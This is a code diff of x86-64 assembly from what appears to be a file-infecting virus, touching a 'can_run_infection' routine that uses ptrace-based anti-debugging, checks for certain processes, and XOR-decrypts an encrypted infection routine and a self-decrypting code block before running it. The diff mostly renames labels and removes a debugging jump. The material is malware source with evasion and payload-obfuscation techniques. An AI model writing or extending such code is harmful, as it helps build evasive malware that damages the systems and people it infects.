@@ -79,10 +79,10 @@ begin:
 ; int can_run_infection();
 ; rax can_run_infection();
 can_run_infection:
-; .TMP_uncipher block will disappear at compilation, and replaced by a maxgic_key,
+; .end_uncipher block will disappear at compilation, and replaced by a magic_key,
 ; result of xor between the two following blocks
-.TMP_START_OF_TWO:
-.TMP_anti_debugging:
+.begin_mixed_code:
+.begin_anti_debugging:
 	mov rax, SYS_PTRACE				; _ret = ptrace(
 	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
 	xor rsi, rsi					; 	0,
@@ -95,9 +95,9 @@ can_run_infection:
 	call check_process				; _ret = check_process();
 	cmp rax, 1					; if (_ret == !)
 	je .process					; 	goto .process;
-.TMP_END_anti_debugging:
+.end_anti_debugging:
 
-.TMP_uncipher:
+.begin_uncipher:
 	lea rdi, [rel begin]				; data = begin addr
 	add rdi, infection_routine - begin		; data += infection_routine - begin
 	mov rsi, [rel compressed_data_size2]		; size = compressed_data_size2
@@ -105,26 +105,25 @@ can_run_infection:
 	mov rcx, key_size				; key_size = key_size
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 	jmp .valid					; goto .valid
-.TMP_END_uncipher:
-.TMP_END_OF_TWO:
+.end_uncipher:
+.end_mixed_code:
 
 	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
 	cmp rax, 0x0					; ...
 	je .valid					; 	goto .valid;
-	lea rdi, [rel .TMP_START_OF_TWO]		; _data = &.TMP_anti_debugging;
-	mov rsi, .TMP_END_OF_TWO - .TMP_START_OF_TWO	;_size = .TMP_END_anti_debugging - .TMP_anti_debugging;
+	lea rdi, [rel .begin_mixed_code]		; _data = &.begin_mixed_code;
+	mov rsi, .end_mixed_code - .begin_mixed_code	;_size = .end_mixed_code - .begin_mixed_code;
 	lea rdx, [rel magic_key]			; _key = &magic_key;
 	mov rcx, magic_key_size				; _key_size = magic_key_size;
 	call xor_cipher					; xor_cipher(_data, _size, _key, _key_size);
 
-	jmp .TMP_START_OF_TWO				; goto .TMP_anti_debugging
+	jmp .begin_mixed_code				; goto .begin_mixed_code
 
 	.valid:
 		mov rax, 1					; return 1;
 		ret
 
 	.debugged:
-		jmp .TMP_END_OF_TWO ; TMP_TODO_DEBUG
 		lea rdi, [rel debugged_message]		; print_string(debugged_message);
 		call print_string			; ...
 		xor rax, rax				; return 0;
